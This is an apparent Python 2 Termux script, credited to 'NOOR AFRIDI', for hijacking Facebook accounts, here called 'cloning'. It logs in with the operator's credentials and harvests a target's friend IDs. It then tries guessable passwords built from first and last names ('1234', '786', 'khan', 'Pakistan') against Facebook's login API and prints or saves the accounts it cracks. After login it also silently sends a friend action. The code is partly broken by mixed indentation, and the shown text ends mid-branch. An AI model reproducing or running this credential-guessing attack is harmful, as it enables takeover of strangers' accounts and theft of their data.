#!/usr/bin/python2

#coding=utf-8

#The Credit For This Code Goes To lovehacker

#If You Wanna Take Credits For This Code, Please Look Yourself Again...

#Reserved2020

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():

	print "\x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.001)

#Dev:Mr Hari

##### LOGO #####

logo = """

\033[1;91m /$$   /$$  /$$$$$$   /$$$$$$  /$$$$$$$ 

\033[1;91m| $$$ | $$ /$$__  $$ /$$__  $$| $$__  $$

\033[1;91m| $$$$| $$| $$  \ $$| $$  \ $$| $$  \ $$

\033[1;91m| $$ $$ $$| $$  | $$| $$  | $$| $$$$$$$/

\033[1;91m| $$  $$$$| $$  | $$| $$  | $$| $$__  $$

\033[1;91m| $$\  $$$| $$  | $$| $$  | $$| $$  \ $$

\033[1;91m| $$ \  $$|  $$$$$$/|  $$$$$$/| $$  | $$

\033[1;91m|__/  \__/ \______/  \______/ |__/  |__/

                                                                                                                  

\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print  """

\033[1;91m     **     ******     **             ****     ****     **     *******     ******** 

\033[1;91m    ****   //////*    ****           /**/**   **/**    ****   /**////**   **//////**

\033[1;91m   **//**       /*   **//**    ***** /**//** ** /**   **//**  /**   /**  **      // 

\033[1;91m  **  //**      *   **  //**  **///**/** //***  /**  **  //** /*******  /**         

\033[1;91m **********    *   **********/*******/**  //*   /** **********/**///**  /**    *****

\033[1;91m/**//////**   *   /**//////**/**//// /**   /    /**/**//////**/**  //** //**  ////**

\033[1;91m/**     /**  *    /**     /**//******/**        /**/**     /**/**   //** //******** 

\033[1;91m//      //  /     //      //  ////// //         // //      // //     //   ////////  

                                                                                                                

\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;92mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•

\033[1;97mtelegram me @Hacker_Afridi

\033[1;97mtelegram chachnall @TERMUX_LOVER"""

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       

print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;92mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "NOOR"

CorrectPassword = "AFRIDI"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;97m📋 \x1b[1;93mTool Username \x1b[1;97m»» \x1b[1;97m")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")

        if (password == CorrectPassword):

            print "Logged in successfully as " + username #Dev:love_hacker

	    time.sleep(2)

            loop = 'false'

        else:

            print "\033[1;94mWrong Password"

            os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

    else:

        print "\033[1;94mWrong Username"

        os.system('xdg-open https://www.facebook.com/DR.N00R.AFRIDI')

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

		print logo

		jalan(' \033[1;93mWarning: \033[1;92mDo Not Use Your Personal Account' )

		jalan(' \033[1;93mWarning: \033[1;92mUse a New Account To Login' )

		jalan(' \033[1;93mWarning: \033[1;92mTermux All Version Working' )

                jalan(' \033[1;91mWarning: \033[1;95mTermux Data Clear Everyday' ) 

                jalan(' \033[1;91mWarning: \033[1;95mTool Update Everyday 👆' )                

		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;92mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		print('\033[1;97m▬\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97m▬' )

		print('	' )

		id = raw_input('\033[1;97m[●] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')

		pwd = raw_input('\033[1;97m[●] \x1b[1;96mPassword\x1b[1;97m      : \x1b[1;93m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\x1b[1;97mThere is no internet connection"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\x1b[1;91mLogin Successful.•◈•..'

				os.system('xdg-open https://youtube.com/@Dr_Noor_Afridi')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;97mThere is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;97mYour Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;94mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

	except KeyError:

		os.system('clear')

		print"\033[1;97mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;94mThere is no internet connection"

		keluar()

	os.system("clear") #Dev:Mr a7a

	print logo

	print "\033[1;97m«--•◈••◈•--\033[1;93mLogged in User Info\033[1;97m---•◈••◈•---»"

	print "	   \033[1;93m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "

	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mA7Ae AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mStart Cloning India"

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mStart Cloning Pakistan"

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia"

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95mStart Cloning USA"

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94mStart Cloning Bangladash"

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;92mStart Target  Attack"

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;91mA7Ae AFRIDI   Massage "

        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\033[1;93mAfter Cloning Data Reset"

	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mlogout "

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")

	if unikers =="":

		print "\x1b[1;97mFill in correctly"

		pilih()

	elif unikers =="1":

		super()

        elif unikers =="2":

		crack()

        elif unikers =="3":

		hack()

        elif unikers =="4":

		black()

        elif unikers =="5":

		mafia()

        elif unikers =="6":

		os.system('clear')

		print logo

		brute()

        elif unikers =="7":

		os.system('clear')

		print logo

		print " \033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Massage•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"

                jalan('\033[1;92m............Massage..........')

                jalan("\033[1;96mFrends Tool everyDay Update")

                jalan('\033[1;96m7 Num Option Use every day ')

                jalan('\033[1;96mChenal Off Due to Strik')

                jalan("\033[1;93m.........Command...........")

                jalan('\033[1;96mapt update')

                jalan('\033[1;96mapt upgrade')

                jalan('\033[1;96mpkg install python')

                jalan('\033[1;96mpkg install python2')

                jalan('\033[1;96mpkg install git')

                jalan('\033[1;96mpip2 install requests')

                jalan('\033[1;96mpip2 install mechanize') 

                jalan("\033[1;96mhttps://github.com/Dr-Noor-AfriDi/Doctor.git")

                jalan('\033[1;96mcd Doctor')

                jalan('\033[1;96mpython2 Noor.py')

                jalan('\033[1;96mUser: NOOR')

                jalan('\033[1;96mpass: AFRIDI')

                jalan('\033[1;92m👆Copy Command & send 2 groups👆')

                jalan('\033[1;91mTELEGRAM Chenal Like Subscrib plzz')

		os.system('git pull origin master')

		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')

		menu()

	elif unikers =="8":

		os.system('clear')

		print logo

		print " \033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Data Reset•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"

                jalan('\033[1;96m=10%')

                jalan("\033[1;96m==20%")

                jalan('\033[1;96m===30%')

                jalan('\033[1;96m====40%')

                jalan("\033[1;96m=====50%")

                jalan("\033[1;96m======60%")

                jalan('\033[1;96m=======70%')

                jalan('\033[1;96m========80%')

                jalan('\033[1;96m=========90%')

                jalan('\033[1;96m==========100%')

                jalan('\033[1;91mCloning Data Reset')

		os.system('git pull origin master')

		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')

		menu()

	elif unikers =="0":

		jalan('Token Removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih()

def crack():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."

        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mTelegram me @Hacker_Afridi."

        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mtelegram TERMUX_LOVER Chenal."

	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"

	pilih_crack()

def pilih_crack():

	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")

	if peak =="":

		print "\x1b[1;91mFill in correctly"

		pilih_crack()

	elif peak =="1":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")

		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]

		except KeyError:

			print"\x1b[1;91mID Not Found!"

			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

			crack()

		print"\033[1;91mGetting IDs\033[1;97m..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

        elif peak =="2":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

        elif peak =="3":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih_crack()

	

	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))

	jalan('\033[1;91mPlease Wait\033[1;94m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)

	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mA7Ae NOOR\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	

			

	def main(arg):

		global oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass #Dev:love_hacker

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '1234'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['first_name'] + '123'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = b['last_name']+'123'										

					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = b['first_name'] + 'khan'											

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = '786786'							

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = 'Pakistan'											

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = b['first_name']+'12345'						

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:						

										                           pass8 = b['last_name'] + '786'											

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = b['first_name'] + '786'					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

